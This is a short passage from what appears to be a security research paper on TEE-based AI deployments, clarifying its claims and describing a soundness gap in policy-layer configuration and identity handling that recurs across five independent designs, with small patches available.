  particular has best-in-survey verification ergonomics for layers
  1-4 and only the policy layer slips.
- That fixes are hard. They aren't — every system has a one- to
  few-line patch that closes its instance of the gap.

The novel contribution is the *cross-system pattern*: that the
same shape of soundness gap recurs in five independent designs
because of structural pressures on how TEE-AI deployments handle
configuration and identity.
